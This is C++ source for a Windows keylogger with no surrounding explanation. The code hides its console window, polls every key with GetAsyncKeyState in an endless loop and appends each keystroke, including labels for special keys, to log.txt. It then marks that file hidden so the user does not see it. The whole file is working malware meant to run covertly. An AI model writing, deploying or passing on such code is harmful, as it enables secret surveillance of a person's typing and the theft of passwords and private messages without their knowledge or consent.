#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

#define EVENT_LOOP_COND true

const static void startLog() {
	while(EVENT_LOOP_COND) {
		for(char key = 1; key < 255; key++) {
			if (GetAsyncKeyState(key) & 0x1) {
				ofstream log;
				log.open("log.txt", ios::app);
				switch((wchar_t)key) {
					case VK_BACK: 	 log << "[backspace]"; break;
					case VK_RETURN:  log << "[enter]"; 	   break;
					case VK_SHIFT: 	 log << "[shift]"; 	   break;
					case VK_CONTROL: log << "[ctrl]";      break;
					case VK_CAPITAL: log << "[capslock]";  break;
					case VK_TAB: 	 log << "[tab]"; 	   break;
					case VK_MENU: 	 log << "[alt]";  	   break;
					case VK_ESCAPE:  log << "[escape]";    break;
					case VK_LEFT: 	 log << "[left]"; 	   break;
					case VK_RIGHT:   log << "[right]"; 	   break;
					case VK_UP: 	 log << "[up]"; 	   break;
					case VK_DOWN: 	 log << "[down]"; 	   break;
					case VK_DELETE:  log << "[delete]";    break;
					case VK_LWIN: 	 log << "[lwin]"; 	   break;
					case VK_NUMLOCK: log << "[numlock]";   break;	
					case VK_LBUTTON:
					case VK_RBUTTON: break;
					default: log << key;
				}
				log.close();
				const char* fileptr = "log.txt";
				int attr = GetFileAttributes(fileptr);
				if (!(attr & FILE_ATTRIBUTE_HIDDEN))
					SetFileAttributes(fileptr, attr | FILE_ATTRIBUTE_HIDDEN);
			}
		}
	}
}

int main(int argv, char** argc) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
	startLog();
	return 0;
}


